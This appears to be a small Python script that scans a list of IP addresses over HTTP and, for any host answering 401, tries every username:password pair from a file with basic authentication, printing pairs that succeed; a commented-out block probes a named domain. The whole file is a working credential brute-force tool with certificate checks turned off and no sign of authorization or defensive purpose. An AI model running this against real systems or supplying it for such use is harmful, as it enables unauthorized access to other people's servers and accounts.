import requests


def read_file(filename):
	return list(open(filename, 'r'))


def check_status(url):
	req = requests.head(url, verify=False)
	return req.status_code


def analyze(url, auth_list):
	code = check_status(url)
	if code == 200:
		print(url, "--> ", code)
	elif 299 < code < 400:
		print(url, "--> ", code)
	elif code == 401:
		attack(url, auth_list)
		print(url, "--> ", code)
	else:
		print(url, "--> OTHER CODE")
		pass


def attack(url, auth_list):
	for pair in auth_list:
		user, passwd = pair.split(":")
		code = authenticate(url, user, passwd)
		if code == 200:
			print("\t", url, " --> AUTH --> ", code , " | ", user, " : ", passwd)
		else:
			print("\t", url, " --> AUTH --> ", code)


def authenticate(url, user, passwd):
	req = requests.get(url, auth=(user, passwd))
	return req.status_code


# #r = requests.get('https://infinz.pl', auth=('user', 'pass'))
# r = requests.head('http://www.infinz.pl', verify=False)
#
# print(r.status_code)
#
# if r.status_code == 301:
# 	url = r.headers['location']
# 	n = requests.head(url)
# 	print(n.status_code)
#
#
# #print(r.headers)


def main():

	ip_file = "ip.list"
	auth_file = "auth.list"

	iplist = read_file(ip_file)
	auth_list = read_file(auth_file)

	for ip in iplist:
		url = "http://" + ip
		analyze(url, auth_list)


if __name__ == "__main__":
	main()